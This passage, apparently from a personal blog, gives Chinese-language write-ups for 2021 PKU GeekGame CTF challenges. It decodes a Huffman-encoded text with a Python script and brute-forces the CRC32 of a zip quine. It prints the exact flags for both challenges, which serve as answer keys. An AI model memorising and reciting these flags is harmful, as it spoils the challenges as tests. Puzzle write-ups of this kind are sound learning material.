101011110010101000011111101011110000111000011010111110011110100101000101010111100001100111101010110100101000011001010101001011000011001111010011001110101001010010101000011001010110011110101011000011001111111011000111101110000110111010101111001010100101010011111111010111101110100010100001110001110000111001011011001111001111011101101110011110100110000110010101011101001111010010100101011000111100100110000110010101100111101010110000111011110000111001111010010101001010011111011100001100111110010111110011110101011101101'
```

简单来说，就是读取了`text.txt`这个文件，然后将其使用`table.pickle`编码，得到最后的结果。提到字符编码，首先计算每个字符对应的编码个数。编码后的总长度为7312，各字符出现频数之和为2210，二者相除得到约3.31，因此不是等长度编码。考虑[霍夫曼编码](https://zh.wikipedia.org/wiki/%E9%9C%8D%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81)，其Python实现如下：（参考[此篇文章](https://www.jianshu.com/p/43928fd58afb)）

``` python
import json

class Node:
    def __init__(self):
        self.frequency = 0
        self.name = None
        self.lchild = None
        self.rchild = None
        self.code = None

    def __lt__(self, other):
        return self.frequency < other.frequency

# establish the Huffman Tree
def estblishHuffmanTree(info_dict):
    #output: the base node
    node_list=[]
    for i in info_dict:
        a = Node()
        a.frequency = info_dict[i]
        a.name = i
        node_list.append(a)
    while len(node_list) > 1:
        node_list.sort(reverse=True)
        node_1 = node_list.pop()
        node_2 = node_list.pop()
        new_node = Node()
        new_node.frequency = node_1.frequency+node_2.frequency
        new_node.lchild = node_1
        new_node.rchild = node_2
        node_list.append(new_node)
    return new_node

result = {
    'e': 70,
    '2': 274,
    '9': 81,
    '4': 124,
    '7': 311,
    '1': 77,
    '6': 649,
    'd': 35,
    'f': 69,
    '0': 208,
    '5': 119,
    'c': 35,
    'a': 3,
    '8': 55,
    '3': 94,
    'b': 6
}

base_node = estblishHuffmanTree(result)
def encode(node,rst_dict,code):
    if node.name:
        rst_dict.append([node.name, code])
        return
    code += '0'
    encode(node.lchild,rst_dict,code)
    code = code[:-1]
    code += '1'
    encode(node.rchild,rst_dict,code)
    return rst_dict

code_dict = encode(base_node, [], '')

with open("table.json", "w") as f:
    json.dump(code_dict, f)
```

得到：

``` json
[
    ["0", "000"],
    ["3", "0010"],
    ["5", "0011"],
    ["8", "01000"],
    ["f", "01001"],
    ["4", "0101"],
    ["2", "011"],
    ["e", "10000"],
    ["1", "10001"],
    ["d", "100100"],
    ["a", "10010100"],
    ["b", "10010101"],
    ["c", "1001011"],
    ["9", "10011"],
    ["7", "101"],
    ["6", "11"]
]
```

先计算一下各个字符的编码长度，然后与对应的出现次数相乘，可以得到总编码长度7312，恰好与原编码长度一致，而霍夫曼编码又可以被证明是最优的，只是具体的编码方式可能会有差异。这里需要注意，字符“c”和“d”出现次数是相同的，二者可以互相交换。

尝试用这个table解码，得到：

```
w$ile gi4ö……
```

{% include figure.html src="https://file.moetu.org/images/2021/05/27/e7fa840c3880421b3ad63e4c73ccb39bf467104a85f4e8b2.png" width="797" height="340" %}

虽然有很多乱码，但看上去已经很接近了。用[HxD](https://mh-nexus.de/en/hxd/)打开上面这个文本文件，第一行为：

```
77 24 69 6C 65 20 67 69 34 F6 96 E6 72 02 46 97
```

猜测文本中第一个词应为“while”，其中“h”对应Unicode码为`0x68`；而目前的解码结果为“\$”，对应Unicode为`0x24`。用上面得到的编码规则分别编码两个字符，并注意到源代码中对文本进行了一次倒序：

```
86：0100011
42：0101011
```

只差“8”的第四位。对这一位进行调换，注意霍夫曼树中相关节点（即“f”和“4”）也要修改：

``` json
[
    ["0", "000"],
    ["3", "0010"],
    ["5", "0011"],
    ["8", "01010"],
    ["f", "01011"],
    ["4", "0100"],
    ["2", "011"],
    ["e", "10000"],
    ["1", "10001"],
    ["d", "100100"],
    ["a", "10010100"],
    ["b", "10010101"],
    ["c", "1001011"],
    ["9", "10011"],
    ["7", "101"],
    ["6", "11"]
]
```

用这个table解码，得到最终结果：

```
while getting his masters degree, a professor gave his students the option of solving a difficult problem instead of taking the final exam. opting for what he thought was the easy way out, my uncle tried to find a solution to the "smallest code" problem. what his professor didn't tell him is that no one at that time knew the best solution. as the term drew to a close, david realized he'd have to start studying for the exam and starting throwing away his scratchings on the problem. as one of the papers hit the trash can, the algorithm came to him. flag{w0w_congrats_th1s_1s_rea11y_huffman} he published the paper "a method for the construction of minimum redundancy codes" describing his algorithm in 1952. this became known as huffman coding. at the time he didn't consider copyrighting or patenting it, because was just an algorithm, and he didn't make a penny off of it. because of its elegance and simplicity, it is described in many textbooks and several web pages. today derivative forms of huffman coding can found in common electronics and web pages (for example, the jpeg image file format).
```

得到flag：`{w0w_congrats_th1s_1s_rea11y_huffman}`。

另外，从题目给出的条件来看，如果交换编码长度相同的两个字符的编码，对总编码长度不会产生影响，但这样的话就有了很多不确定性，好在本题并未涉及。

## 巴别压缩包
### 题目说明
宇宙（有的人把它叫做图书馆）由一个结构不明确的，也许是无限复杂的 ZIP文件 所构成，每一个 ZIP 文件由至少一个局部文件记录与一个中央目录记录组成。局部文件记录包含局部文件首部与文件数据，局部文件首部总是由 0x04034b50 开始，其后的数据决定了这个文件的版本、压缩方式、修改时间、校验码、文件长度、文件名等信息。中央目录记录包含若干个中央目录首部与一个中央目录尾部，中央目录首部与局部文件记录一一对应，总是由 0x02014b50 开始，包含了与局部文件首部的位置，与其相似的信息以及其他信息。中央目录尾部总是由 0x06054b50 开始，记录了中央目录记录的位置以及记录的数量。

通过解压程序，每个局部文件解压后都可以是一个 ZIP 文件，从数目不定的子文件中又会解压出新的 ZIP 文件，形成了一个树状的迷宫。每一个 ZIP 文件的文件名都由数字、字母与一些符号组成，有些文件仅以不断递增的数字命名，还有的文件则像是葡萄牙文、意大利文或是什么其他语言或是方言或是原始语言的组合，其他文件则看上去纯粹是一堆乱码。

有的时候可能会在大量的乱码文件中找到一段可读的文本，它可能描述了一个从 42KB 文件中解压出 4.5PB 的故事，也可能指示了其他 ZIP 文件在文件树中的位置。有时候它声称 ZIP 文件的嵌套深度是无限的，虽然文件的大小总是有限的，而且总是由 256 种字节为符号组合起来。一种可能的解读是所有的 ZIP 文件都是由一个叫做 quine.zip 的文件衍生出来的，这个不到 1KB 的文件永远也无法解压到底，确切地说每一层 quine.zip 解压出一个也叫做 quine.zip 的压缩文件，它和上一层的 quine.zip 大小一样，内容也完全相同。

然而按此描述找到的 quine.zip 文件却不如传说那般完美，它的 CRC32 校验码与其解压的文件总是对不上。可能是创建压缩文件时出的错误，也可能是遭到了恶意的篡改。总之这个问题在另外的文件中被指出，并声称只要在合适的位置找到正确的数据来修复 quine.zip，就可以得到完美的 ZIP 文件。这样做有什么意义呢？也许从它可以得到某个比赛的特殊标志（Flag）吧。

**文件内容（“\*\*” 符号表示损坏的数据）**

```
$ hexdump -Cv quine.zip 
00000000  50 4b 03 04 14 00 00 00  08 00 7d bf a1 52 ** **  
00000010  ** ** 45 01 00 00 1e 02  00 00 09 00 1c 00 71 75  
00000020  69 6e 65 2e 7a 69 70 55  54 09 00 03 ff 7a 8d 60  
00000030  ff 7a 8d 60 75 78 0b 00  01 04 e8 03 00 00 04 e8  
00000040  03 00 00 00 48 00 b7 ff  50 4b 03 04 14 00 00 00  
00000050  08 00 7d bf a1 52 ** **  ** ** 45 01 00 00 1e 02  
00000060  00 00 09 00 1c 00 71 75  69 6e 65 2e 7a 69 70 55  
00000070  54 09 00 03 ff 7a 8d 60  ff 7a 8d 60 75 78 0b 00  
00000080  01 04 e8 03 00 00 04 e8  03 00 00 00 48 00 b7 ff  
00000090  22 c6 1c 62 cc 01 00 00  00 ff ff 00 10 00 ef ff  
000000a0  22 c6 1c 62 cc 01 00 00  00 ff ff 00 10 00 ef ff  
000000b0  42 e7 03 00 10 00 ef ff  42 e7 03 00 10 00 ef ff  
000000c0  42 e7 03 00 10 00 ef ff  42 e7 03 00 10 00 ef ff  
000000d0  82 d1 00 00 9b 00 64 ff  82 d1 00 00 9b 00 64 ff  
000000e0  82 d1 00 00 9b 00 64 ff  1b c4 4e 03 00 50 4b 01  
000000f0  02 1e 03 14 00 00 00 08  00 7d bf a1 52 ** ** **  
00000100  ** 45 01 00 00 1e 02 00  00 09 00 18 00 00 00 00  
00000110  00 01 00 00 00 a4 81 00  00 00 00 71 75 69 6e 65  
00000120  2e 7a 69 70 55 54 05 00  03 ff 7a 8d 60 75 78 0b  
00000130  00 01 04 e8 03 00 00 04  e8 03 00 00 50 4b 05 06  
00000140  00 00 00 00 01 00 01 00  4f 00 00 00 88 01 00 00  
00000150  31 00 71 75 69 6e 65 2e  7a 69 70 20 66 6f 72 20  
00000160  32 30 32 31 50 4b 55 47  47 47 30 20 2d 2d 20 6d  
00000170  61 64 65 20 62 79 20 63  68 65 73 68 69 72 65 5f  
00000180  63 61 74 1b c4 4e 03 00  50 4b 01 02 1e 03 14 00  
00000190  00 00 08 00 7d bf a1 52  ** ** ** ** 45 01 00 00  
000001a0  1e 02 00 00 09 00 18 00  00 00 00 00 01 00 00 00  
000001b0  a4 81 00 00 00 00 71 75  69 6e 65 2e 7a 69 70 55  
000001c0  54 05 00 03 ff 7a 8d 60  75 78 0b 00 01 04 e8 03  
000001d0  00 00 04 e8 03 00 00 50  4b 05 06 00 00 00 00 01  
000001e0  00 01 00 4f 00 00 00 88  01 00 00 31 00 71 75 69  
000001f0  6e 65 2e 7a 69 70 20 66  6f 72 20 32 30 32 31 50  
00000200  4b 55 47 47 47 30 20 2d  2d 20 6d 61 64 65 20 62  
00000210  79 20 63 68 65 73 68 69  72 65 5f 63 61 74        
0000021e
```

Flag 格式:

> flag{QUINE_XXXXXXXX_XXXXXXXX_XXXXXXXX_XXXXXXXX}

其中 “XXXXXXXX” 为四段被损坏的数据的大写十六进制编码。

**点击 “打开/下载题目” 下载题目附件**

[打开/下载题目](https://geekgame.pku.edu.cn/media/a46c9089-81b3-4215-8565-64cf321544a2.zip)

### 解法
这道题需要对zip文件格式有一定了解。参考[这篇文章](https://blog.csdn.net/a200710716/article/details/51644421)，所给文件中缺失的数据恰好是zip文件的[crc32](https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97)（[小端序](https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F#%E5%B0%8F%E7%AB%AF%E5%BA%8F)）。而由于本文件是个zip套娃，这个crc32应该恰好等于文件自身的crc32。好在crc32求解比较简单，而且仅有4个字节，因此直接考虑暴力运算：

``` python
import zlib
import struct
import time

t = time.time()

with open("quine.bin", "rb") as f:
    base = f.read()

try:
    with open("last.txt") as f:
        start = int(f.read())
except:
    start = 1

for i in range(start - 1, 0x100 ** 4):
    inp = base.replace(b"\xff\xff\xff\xff", struct.pack("<L", i))
    crc = zlib.crc32(inp)
    if i == crc:
        print("result:", i)
        with open("quineresult.bin", "wb") as f:
            f.write(inp)
        break
    if (time.time() - t) > 30:
        with open("last.txt", "w") as f:
            f.write(str(i))
        t = time.time()
        print("time:", t)
```

我扔到云服务器跑了一会就出了结果，crc32为`4a0955f5`时恰好满足要求，因此flag为`flag{QUINE_F555094A_F555094A_F555094A_F555094A}`。

另外这个题我似乎是第一个解出来的，拿下一血。

## 其他题目
还剩下5个题目我没有做，其中2个和密码学有关，3个和[pwn](https://zh.wikipedia.org/wiki/Pwn)有关，都是我不擅长的东西。

- 千年讲堂的方形轮子：加密方式为AES-CBC和AES-ECB，网上倒是可以找到很多讲解，我也尝试了一下替换密文中的字符，但是没有尝试系统地解码。
- 皮浪的解码器：我尝试了一下反编译，发现了flag的地址在declen的地址后面，或许可以通过一些方法在输出解码结果的同时输出flag。我也尝试了输入长字符串，但没想到需要长度 mod 4 == 3。
- 安全的密钥交换：源代码看得头大，但是看了官方题解之后稍微明白了一些。
- 庄子的回文/←签退→：题解都看不懂，算了。

## 后记
最后的结果，总分2448，排名19，拿到了一个一血，还不错。

希望这篇文章对大家有所帮助，祝大家玩得愉快。

{% include figure.html src="https://file.moetu.org/images/2021/05/29/d82d373b03a57d8b14de3cbf69d5924bc36ad5bb5374137d.jpg" width="300" height="200" %}

{% include figure.html src="https://file.moetu.org/images/2021/05/29/17acd0f36a14d75e31c04a690cdfd6267f56935fc8286bf3.jpg" width="300" height="200" %}